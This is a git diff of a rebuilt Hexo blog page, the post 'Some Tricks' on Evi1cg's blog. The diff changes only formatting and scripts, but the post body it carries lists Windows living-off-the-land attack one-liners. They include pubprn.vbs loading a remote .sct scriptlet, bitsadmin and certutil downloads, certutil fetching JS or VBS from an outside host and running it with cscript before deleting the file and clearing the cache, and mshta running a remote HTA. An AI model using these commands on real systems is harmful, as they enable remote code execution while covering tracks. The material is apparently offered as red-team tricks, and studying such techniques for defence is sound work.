@@ -1,4 +1,21 @@
-<!DOCTYPE html><html class="theme-next pisces use-motion" lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0">
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
@@ -68,7 +85,7 @@
     back2top_sidebar: false,
     fancybox: true,
     fastclick: true,
-    lazyload: true,
+    lazyload: false,
     tabs: true,
     motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
     algolia: {
@@ -92,7 +109,7 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="Some Tricks">
 <meta property="og:url" content="https://evi1cg.github.io/archives/Tricks.html">
-<meta property="og:site_name" content="Evi1cg's blog">
+<meta property="og:site_name" content="Evi1cg&#39;s blog">
 <meta property="og:description" content="远程执行sct的另一种姿势 1cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:updated_time" content="2019-01-14T14:44:26.000Z">
@@ -478,19 +495,19 @@
       
 
       
-        <meta name="generator" content="Hexo 3.9.0"><p>远程执行sct的另一种姿势</p>
-<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript /<span class="selector-tag">b</span> C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn<span class="selector-class">.vbs</span> <span class="number">127.0</span>.<span class="number">0.1</span> script:https:<span class="comment">//gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct</span></span><br></pre></td></tr></tbody></table></figure>
+        <p>远程执行sct的另一种姿势</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript /<span class="selector-tag">b</span> C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn<span class="selector-class">.vbs</span> <span class="number">127.0</span>.<span class="number">0.1</span> script:https:<span class="comment">//gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct</span></span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>detail：<a href="https://posts.specterops.io/wsh-injection-a-case-study-fd35f79d29dd" target="_blank" rel="noopener">https://posts.specterops.io/wsh-injection-a-case-study-fd35f79d29dd</a></p>
 </blockquote>
-<p>命令行下载姿势1<br></p><figure class="highlight groovy"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin <span class="regexp">/rawreturn /</span>transfer getfile <span class="string">http:</span><span class="comment">//download.sysinternals.com/files/PSTools.zip c:\p.zip</span></span><br><span class="line">bitsadmin <span class="regexp">/rawreturn /</span>transfer getpayload <span class="string">http:</span><span class="comment">//download.sysinternals.com/files/PSTools.zip c:\p.zip</span></span><br><span class="line">bitsadmin <span class="regexp">/transfer myDownLoadJob /</span>download <span class="regexp">/priority normal "http:/</span><span class="regexp">/download.sysinternals.com/</span>files/PSTools.zip<span class="string">" "</span><span class="string">c:</span>\p.zip<span class="string">"</span></span><br></pre></td></tr></tbody></table></figure><p></p>
-<p>命令行下载姿势2<br></p><figure class="highlight groovy"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f <span class="string">http:</span><span class="comment">//192.168.254.102:80/a.txt b.txt</span></span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>命令行下载姿势1<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin <span class="regexp">/rawreturn /</span>transfer getfile <span class="string">http:</span><span class="comment">//download.sysinternals.com/files/PSTools.zip c:\p.zip</span></span><br><span class="line">bitsadmin <span class="regexp">/rawreturn /</span>transfer getpayload <span class="string">http:</span><span class="comment">//download.sysinternals.com/files/PSTools.zip c:\p.zip</span></span><br><span class="line">bitsadmin <span class="regexp">/transfer myDownLoadJob /</span>download <span class="regexp">/priority normal "http:/</span><span class="regexp">/download.sysinternals.com/</span>files/PSTools.zip<span class="string">" "</span><span class="string">c:</span>\p.zip<span class="string">"</span></span><br></pre></td></tr></table></figure></p>
+<p>命令行下载姿势2<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f <span class="string">http:</span><span class="comment">//192.168.254.102:80/a.txt b.txt</span></span><br></pre></td></tr></table></figure></p>
 <blockquote>
 <p>清除缓存 certutil -urlcache -split -f <a href="http://192.168.254.102:80/a.txt" target="_blank" rel="noopener">http://192.168.254.102:80/a.txt</a> delete</p>
 </blockquote>
-<p>命令行执行远程JS<br></p><figure class="highlight groovy"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f <span class="string">http:</span><span class="comment">//192.168.254.102:80/a a.js && cscript a.js &&  del a.js && certutil -urlcache -split -f http://192.168.254.102:80/a delete</span></span><br></pre></td></tr></tbody></table></figure><p></p>
-<p>命令行远程执行VBS<br></p><figure class="highlight groovy"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f <span class="string">http:</span><span class="comment">//192.168.254.102:80/abc a.vbs && cscript a.vbs &&  del a.vbs && certutil -urlcache -split -f http://192.168.254.102:80/abc delete</span></span><br></pre></td></tr></tbody></table></figure><p></p>
-<p>命令行远程执行HTA<br></p><figure class="highlight groovy"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta <span class="string">http:</span><span class="comment">//192.168.254.102/1.hta</span></span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>命令行执行远程JS<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f <span class="string">http:</span><span class="comment">//192.168.254.102:80/a a.js &amp;&amp; cscript a.js &amp;&amp;  del a.js &amp;&amp; certutil -urlcache -split -f http://192.168.254.102:80/a delete</span></span><br></pre></td></tr></table></figure></p>
+<p>命令行远程执行VBS<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f <span class="string">http:</span><span class="comment">//192.168.254.102:80/abc a.vbs &amp;&amp; cscript a.vbs &amp;&amp;  del a.vbs &amp;&amp; certutil -urlcache -split -f http://192.168.254.102:80/abc delete</span></span><br></pre></td></tr></table></figure></p>
+<p>命令行远程执行HTA<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta <span class="string">http:</span><span class="comment">//192.168.254.102/1.hta</span></span><br></pre></td></tr></table></figure></p>
 
       
     </div>
@@ -835,7 +852,7 @@
                   
                     
                   
-                  <a href="https://github.com/Ridter" title="GitHub → https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  <a href="https://github.com/Ridter" title="GitHub &rarr; https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -846,7 +863,7 @@
                   
                     
                   
-                  <a href="https://twitter.com/Evi1cg" title="Twitter → https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  <a href="https://twitter.com/Evi1cg" title="Twitter &rarr; https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -857,7 +874,7 @@
                   
                     
                   
-                  <a href="https://weibo.com/Ridter" title="微博 → https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
+                  <a href="https://weibo.com/Ridter" title="微博 &rarr; https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -868,7 +885,7 @@
                   
                     
                   
-                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail → mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail &rarr; mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                 </span>
               
             </div>
@@ -903,7 +920,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">© 2015 – <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">&copy; 2015 – <span itemprop="copyrightYear">2019</span>
   <span class="with-love" id="animate">
     <i class="fa fa-heart"></i>
   </span>
@@ -965,8 +982,6 @@
 
 
 
-  
-
 
 
 
@@ -995,9 +1010,6 @@
 
   
   <script src="//cdn.jsdelivr.net/npm/fastclick@1/lib/fastclick.min.js"></script>
-
-  
-  <script src="//cdn.jsdelivr.net/npm/jquery-lazyload@1/jquery.lazyload.min.js"></script>
 
   
   <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.min.js"></script>
@@ -1441,11 +1453,6 @@
   
 
   
-  
-  
-  <script src="/lib/pangu/dist/pangu.min.js?v=3.3"></script>
-  <script>pangu.spacingPage();</script>
-
 
   
 
@@ -1585,6 +1592,5 @@
   <script>
   $("body").backstretch("https://blogpics-1251691280.file.myqcloud.com/imgs/20190121234042.jpg");
   </script>
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script>
-
-<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script></body>
+</html>
